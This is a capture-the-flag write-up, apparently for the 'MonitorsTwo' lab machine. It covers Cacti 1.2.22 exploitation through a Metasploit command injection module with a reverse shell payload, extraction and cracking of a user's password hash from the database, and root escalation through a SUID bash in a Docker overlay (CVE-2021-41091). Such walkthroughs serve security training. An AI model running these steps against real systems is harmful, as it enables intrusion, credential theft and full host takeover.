# Recon :
~~~
nmap -sC -sV 10.10.11.211
~~~

~~~
nmap -sC -sV 10.10.11.211 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 20:30 GMT 
Nmap scan report for 10.10.11.211
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused) 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:
| 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) 
| 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 57.22 seconds
~~~

***When enter IP into browser we got cacti version 1.2.22 is damn vulnerable to rce***

![[2023-05-01_02-05.png]]

***Exploit available in metasploit***


# FOR USERFLAG

~~~
[msf](Jobs:0 Agents:0) exploit(linux/http/cacti_unauthenticated_cmd_injection) >> options

Module options (exploit/linux/http/cacti_unauthenticated_cmd_injection):

   Name                Current Setting      Required  Description
   ----                ---------------      --------  -----------
   HOST_ID                                  no        The host_id value to use. By default, the module will try to bruteforce this.
   LOCAL_DATA_ID                            no        The local_data_id value to use. By default, the module will try to bruteforce
                                                      this.
   Proxies             http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS              10.129.214.128       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                                      cs/using-metasploit.html
   RPORT               80                   yes       The target port (TCP)
   SSL                 false                no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                  no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI           /                    yes       The base path to Cacti
   URIPATH                                  no        The URI to use for this exploit (default is random)
   VHOST                                    no        HTTP server virtual host
   X_FORWARDED_FOR_IP  127.0.0.1            yes       The IP to use in the X-Forwarded-For HTTP header. This should be resolvable to
                                                       a hostname in the poller table.


   When CMDSTAGER::FLAVOR is one of auto,certutil,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.14.116     yes       The local host or network interface to listen on. This must be an address on the local machin
                                       e or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  10.10.14.116     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Automatic (Linux Dropper)



~~~

~~~
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
 first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"


~~~

~~~
mysql --host=db --user=root --password=root cacti -e "show tables"
~~~

![[sql.png]]

**Found**
~~~
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
~~~

~~~
cracked : marcus:funkymonkey
~~~

# FOR ROOT

***Enter into real machine as Marcus with the credentials we got..!!Got user flag***

**We can see the mail content:**

~~~
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb 
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of 
Dear all, 

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible. 

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability. 

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. 

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards, 

Administrator 
CISO 
Monitor Two 
Security Team
~~~

**We are going to use this:**
~~~
https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558
~~~

~~~
findmnt
~~~

~~~
marcus@monitorstwo:/var/mail$ findmnt
TARGET                                SOURCE     FSTYPE     OPTIONS
/                                     /dev/sda2  ext4       rw,relatime
├─/sys                                sysfs      sysfs      rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs securityfs rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs      tmpfs      ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup2    cgroup2    rw,nosuid,nodev,noexec,relatime,nsdelegate
│ │ ├─/sys/fs/cgroup/systemd          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
│ │ ├─/sys/fs/cgroup/cpuset           cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,cpuset
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
│ │ ├─/sys/fs/cgroup/memory           cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,memory
│ │ ├─/sys/fs/cgroup/perf_event       cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,perf_event
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,hugetlb
│ │ ├─/sys/fs/cgroup/freezer          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,freezer
│ │ ├─/sys/fs/cgroup/devices          cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,devices
│ │ ├─/sys/fs/cgroup/blkio            cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,blkio
│ │ ├─/sys/fs/cgroup/rdma             cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,rdma
│ │ └─/sys/fs/cgroup/pids             cgroup     cgroup     rw,nosuid,nodev,noexec,relatime,pids
│ ├─/sys/fs/pstore                    pstore     pstore     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/bpf                       none       bpf        rw,nosuid,nodev,noexec,relatime,mode=700
│ ├─/sys/kernel/tracing               tracefs    tracefs    rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/debug                 debugfs    debugfs    rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/config                configfs   configfs   rw,nosuid,nodev,noexec,relatime
│ └─/sys/fs/fuse/connections          fusectl    fusectl    rw,nosuid,nodev,noexec,relatime
├─/proc                               proc       proc       rw,nosuid,nodev,noexec,relatime
│ └─/proc/sys/fs/binfmt_misc          systemd-1  autofs     rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=1
├─/dev                                udev       devtmpfs   rw,nosuid,noexec,relatime,size=1966928k,nr_inodes=491732,mode=755
│ ├─/dev/pts                          devpts     devpts     rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
│ ├─/dev/shm                          tmpfs      tmpfs      rw,nosuid,nodev
│ ├─/dev/mqueue                       mqueue     mqueue     rw,nosuid,nodev,noexec,relatime
│ └─/dev/hugepages                    hugetlbfs  hugetlbfs  rw,relatime,pagesize=2M
├─/run                                tmpfs      tmpfs      rw,nosuid,nodev,noexec,relatime,size=402608k,mode=755
│ ├─/run/lock                         tmpfs      tmpfs      rw,nosuid,nodev,noexec,relatime,size=5120k
│ ├─/run/docker/netns/1c18c74f6d4b    nsfs[net:[4026532598]]
│ │                                              nsfs       rw
│ ├─/run/user/1000                    tmpfs      tmpfs      rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,gid=1000
│ └─/run/docker/netns/526e4de475e4    nsfs[net:[4026532662]]
│                                                nsfs       rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay    overlay    rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm        tmpfs      rw,nosuid,nodev,noexec,relatime,size=65536k
~~~


**We can see**

~~~
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
~~~

~~~
marcus@monitorstwo:/tmp$ ls -la /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff total 52
drwxr-xr-x 7 root root 4096 Mar 21 10:49 . 
drwx-----x 5 root root 4096 Apr 27 11:25 ..
drwxr-xr-x 2 root root 4096 Mar 22 13:21 bin 
drwx------ 2 root root 4096 Mar 21 10:50 root 
drwxr-xr-x 3 root root 4096 Nov 15 04:17 run 
drwxrwxrwt 2 root root 16384 Apr 29 22:28 tmp 
drwxr-xr-x 3 root root 4096 Nov 15 04:13 var

marcus@monitorstwo:/tmp$ ls -laR /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin: total 1220 
drwxr-xr-x 2 root root 4096 Mar 22 13:21 . 
drwxr-xr-x 7 root root 4096 Mar 21 10:49 .. 
-rwsr-xr-x 1 root root 1234376 Mar 27 2022 bash

~~~


Confirmed suid bash Now we call it then escalate to root (Host) and get the system flag

**Command**

~~~
/var/lib/docker/overlay2/<Docker>/diff//bin/bash -p

~~~

~~~
marcus@monitorstwo:/var/lib/docker/overlay2$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin/bash -p
bash-5.1# cat /root/root.txt
ba34c4fd33c10b8afda9f81865e34334
~~~
